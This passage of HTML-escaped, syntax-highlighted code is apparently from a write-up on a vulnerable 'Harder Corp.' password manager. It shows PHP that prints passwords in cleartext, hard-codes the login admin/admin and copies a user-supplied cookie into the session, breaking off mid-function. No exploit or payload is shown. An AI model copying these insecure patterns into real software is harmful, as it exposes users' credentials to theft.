&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;20
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:index.php&#34; data-lang=&#34;php:index.php&#34;&gt;    &lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
    &lt;span class=&#34;nx&#34;&gt;session_start&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;auth.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$login&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;nx&#34;&gt;Login&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
    &lt;span class=&#34;nv&#34;&gt;$login&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;authorize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;();&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;hmac.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
    &lt;span class=&#34;k&#34;&gt;require&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s2&#34;&gt;&amp;#34;credentials.php&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
  &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt; 
    &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;table&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;border: 1px solid;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;border: 1px solid;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;url&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;border: 1px solid;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;username&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;border: 1px solid;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;password (cleartext)&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;border: 1px solid;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;0&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;border: 1px solid;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;1&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
         &lt;span class=&#34;p&#34;&gt;&amp;lt;&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt; &lt;span class=&#34;na&#34;&gt;style&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;=&lt;/span&gt;&lt;span class=&#34;s&#34;&gt;&amp;#34;border: 1px solid;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;&lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt; &lt;span class=&#34;k&#34;&gt;echo&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$creds&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;mi&#34;&gt;2&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt; &lt;span class=&#34;cp&#34;&gt;?&amp;gt;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;td&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
       &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;tr&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
     &lt;span class=&#34;p&#34;&gt;&amp;lt;/&lt;/span&gt;&lt;span class=&#34;nt&#34;&gt;table&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;
&lt;/div&gt;
  
&lt;div id=&#34;c1477b2b819ef060&#34; class=&#34;codetab__content&#34;&gt;
  &lt;div class=&#34;highlight&#34;&gt;&lt;div class=&#34;chroma&#34;&gt;
&lt;table class=&#34;lntable&#34;&gt;&lt;tr&gt;&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code&gt;&lt;span class=&#34;lnt&#34;&gt;  1
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  2
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  3
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  4
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  5
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  6
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  7
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  8
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;  9
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 10
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 11
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 12
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 13
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 14
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 15
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 16
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 17
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 18
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 19
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 20
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 21
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 22
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 23
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 24
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 25
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 26
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 27
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 28
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 29
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 30
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 31
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 32
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 33
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 34
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 35
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 36
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 37
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 38
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 39
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 40
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 41
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 42
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 43
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 44
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 45
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 46
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 47
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 48
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 49
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 50
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 51
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 52
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 53
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 54
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 55
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 56
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 57
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 58
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 59
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 60
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 61
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 62
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 63
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 64
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 65
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 66
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 67
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 68
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 69
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 70
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 71
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 72
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 73
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 74
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 75
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 76
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 77
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 78
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 79
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 80
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 81
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 82
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 83
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 84
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 85
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 86
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 87
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 88
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 89
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 90
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 91
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 92
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 93
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 94
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 95
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 96
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 97
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 98
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt; 99
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;100
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;101
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;102
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;103
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;104
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;105
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;106
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;107
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;108
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;109
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;110
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;111
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;112
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;113
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;114
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;115
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;116
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;117
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;118
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;119
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;120
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;121
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;122
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;123
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;124
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;125
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;126
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;127
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;128
&lt;/span&gt;&lt;span class=&#34;lnt&#34;&gt;129
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class=&#34;lntd&#34;&gt;
&lt;pre class=&#34;chroma&#34;&gt;&lt;code class=&#34;language-php:auth.php&#34; data-lang=&#34;php:auth.php&#34;&gt;  &lt;span class=&#34;cp&#34;&gt;&amp;lt;?php&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LOGIN_USER&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LOGIN_PASS&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;admin&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;LOGOUT_COMPLETE&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;You&amp;#39;ve been successfully logged out.&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;INCORRECT_USERNAME_PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Invalid login credentials!&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;STARTER_GREETING&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Harder Corp. - Password Manager&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;USERNAME&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ENTER_USERNAME&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Enter Username&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;ENTER_PASSWORD&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Enter Password&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;REMEMBER_THIS_COMPUTER&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Remember this computer&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;
&lt;span class=&#34;nx&#34;&gt;define&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;BUTTON_LOGIN&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;,&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;Log in &amp;amp;rarr;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;);&lt;/span&gt;

&lt;span class=&#34;c1&#34;&gt;// ================================================================================================
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// ### DO NOT TOUCH ANYTHING BELOW THIS LINE ###
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;// ================================================================================================
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;
&lt;span class=&#34;k&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;nc&#34;&gt;Login&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;// unique prefix that is used with this object (on cookies and password salt)
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$prefix&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;login_&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;// days &amp;#34;remember me&amp;#34; cookies will remain
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$cookie_duration&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;mi&#34;&gt;21&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;// temporary values for comparing login are auto set here. do not set your own $user or $pass here
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$user&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;
  &lt;span class=&#34;k&#34;&gt;var&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$pass&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;s2&#34;&gt;&amp;#34;&amp;#34;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;;&lt;/span&gt;

&lt;span class=&#34;k&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;nf&#34;&gt;authorize&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;()&lt;/span&gt; &lt;span class=&#34;p&#34;&gt;{&lt;/span&gt;
  &lt;span class=&#34;c1&#34;&gt;//save cookie info to session
&lt;/span&gt;&lt;span class=&#34;c1&#34;&gt;&lt;/span&gt;  &lt;span class=&#34;k&#34;&gt;if&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nx&#34;&gt;isset&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;(&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;])){&lt;/span&gt;
      &lt;span class=&#34;nv&#34;&gt;$_SESSION&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;]&lt;/span&gt; &lt;span class=&#34;o&#34;&gt;=&lt;/span&gt; &lt;span class=&#34;nv&#34;&gt;$_COOKIE&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;[&lt;/span&gt;&lt;span class=&#34;nv&#34;&gt;$this&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;-&amp;gt;&lt;/span&gt;&lt;span class=&#34;na&#34;&gt;prefix&lt;/span&gt;&lt;span class=&#34;o&#34;&gt;.&lt;/span&gt;&lt;span class=&#34;s1&#34;&gt;&amp;#39;user&amp;#39;&lt;/span&gt;&lt;span class=&#34;p&#34;&gt;];&lt;/span&gt;
